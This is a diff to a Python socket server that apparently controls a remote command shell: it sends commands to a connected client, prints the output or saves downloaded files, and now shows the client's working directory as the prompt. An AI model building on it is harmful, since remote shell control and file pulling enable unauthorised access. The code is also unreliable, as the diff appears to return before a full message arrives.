@@ -7,6 +7,7 @@ class Socket:
 
     header = 20
     established = False
+    current_working_directory = "Working Directory> "
 
     def __init__(self, ip_address, port):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -33,6 +34,7 @@ class Socket:
             print(f"Lost connection to {self.address}")
             return False
         if "-batch" in command.decode() or "cd.." in command.decode() or "cd" in command.decode() and "-cdrive" not in command.decode():
+            self.receive_command_output(current_working_directory=True)
             return
         if "-download" in command.decode():
             name, ending = command.decode().split(".")
@@ -43,7 +45,7 @@ class Socket:
             return
         self.receive_command_output()
 
-    def receive_command_output(self, download=False, file_ending="", file_name=""):
+    def receive_command_output(self, download=False, file_ending="", file_name="", current_working_directory=False):
         full_msg = b''
         new_msg = True
         while True:
@@ -58,15 +60,17 @@ class Socket:
                 new_msg = False
             full_msg += msg_rec
             if len(full_msg) - self.header == msg_len:
-                if not download:
-                    full_msg = loads(full_msg[self.header:])
-                    print(full_msg)
-                else:
+                if download:
                     full_msg = full_msg[self.header:]
                     new_file = open(file_name + "." + file_ending, "wb+")
                     new_file.write(full_msg)
                     new_file.close()
-                return full_msg
+                elif current_working_directory:
+                    self.current_working_directory = full_msg
+                else:
+                    full_msg = loads(full_msg[self.header:])
+                    print(full_msg)
+            return full_msg
 
 
 connection = Socket(socket.gethostname(), 20000)
@@ -79,7 +83,7 @@ while True:
     if not connection.established:
         connection.listen_to_for_client()
     if connection.established:
-        user_input = input("> ")
+        user_input = input(connection.current_working_directory)
         if user_input != ' ' and user_input != '':
             connection.send_command(user_input)
         sleep(1)
